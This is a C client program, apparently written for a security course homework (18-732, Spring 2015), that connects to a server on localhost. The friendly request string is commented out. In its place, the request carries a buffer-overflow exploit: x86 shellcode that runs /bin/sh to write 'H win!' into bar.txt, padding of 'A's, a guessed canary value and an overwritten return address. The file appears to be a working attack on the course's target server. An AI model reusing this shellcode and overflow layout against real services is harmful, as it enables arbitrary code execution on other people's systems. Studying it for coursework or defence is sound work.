/* file: clien2.c class: 18-732, Spring 2015 assignment: Homework 1
*/

/* Obligatory includes */


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <sys/time.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <stdarg.h>
#include <errno.h>



int main(int argc, char** argv)
{
/*
	char reqstring[1000] =
		"1|The cure for boredom is curiosity."
		" There is no cure for curiosity."
		" --Dorothy Parker";
*/
	char reqstring[1000] =
		"1|\xeb\x5e\x90\x90\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08"
		"\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24\xfc\x8d\x56\x0c\xcd"
		"\x80\x90\x5e\x56\x88\x46\x02\xe8\xda\xff\xff\xff\x2f\x62\x69"
		"\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b\x90\x90"
		"\x90\x90\x90\x90\x5e\x56\x8a\x46\x06\x83\xc0\x01\x88\x46\x06"
		"\x31\xc0\x88\x46\x17\xe8\xcb\xff\xff\xff\x2d\x63\x4a\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x31\xc0\x83\xec\x04\x89\x04\x24\x90"
		"\x90\x90\x90\x90\x90\x90\x90\xe8\xcb\xff\xff\xff\x65\x63\x68"
		"\x6f\x20\x22\x48\x20\x77\x69\x6e\x21\x22\x20\x3e\x20\x62\x61"
		"\x72\x2e\x74\x78\x74\x4a"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfe\xca\xde\xde"
		"AAAAAAAAAAAAAAAA"
		"\x98\x6b\x48\x55"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		"AAAAAAAAAAAAAA";

	int PORTNUM;
	char SERVER_IP[16];
    
	int sock, nbytes, i, total, s;
	char request[1000];
	char recvline[1000];
	struct sockaddr_in srv;
 
	/* Set up some defaults for if you don't enter any parameters */ 
	PORTNUM = 18732; //23781;
	strcpy(SERVER_IP, "127.0.0.1");	

	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
        
	/* Process command line switches */
	/* Usage: client [-port <port_number>] [-server <server_IP>] */
	for(i = 1; i < argc; i++){
		if(argv[i][0] == '-'){
			if(strcmp(argv[i], "-port") == 0){
				PORTNUM = atoi(argv[++i]);
			}else if(strcmp(argv[i], "-server") == 0){
				strncpy(SERVER_IP, argv[++i],16);
		 }else{
				printf("Unknown switch \"%s\"\n", argv[i]);
				exit(1);
			}
		}else{
			printf("Unknown switch \"%s\"\n", argv[i]);
			exit(1);
		}
	}

	/* Fill in the server data structure */
	memset(&srv, 0, sizeof(srv));
	srv.sin_family = AF_INET;
	srv.sin_port = htons(PORTNUM);
	srv.sin_addr.s_addr = inet_addr(SERVER_IP);

	/* Create the socket */
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("socket");
		exit(1);
	}

	printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);

	/* Connect to the socket */
	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
		perror("connect");
		exit(1);
	}

	printf("The request is:\n%s\n", reqstring); 

	/* Make the request */
	strncpy(request, reqstring,1000 ); 
	total = 0;
	s = strlen(request);
	while( total < s){
		nbytes = write(sock, request + total, s);
		total = total + nbytes;
	} 

        printf("The response of the server is:\n");	

	/* Get and output the response */
	nbytes = 0;
	while( (nbytes = read(sock, recvline, 1000)) > 0){
		recvline[nbytes] = 0;
		printf("%s\n", recvline); 
	}


	return(0);
}

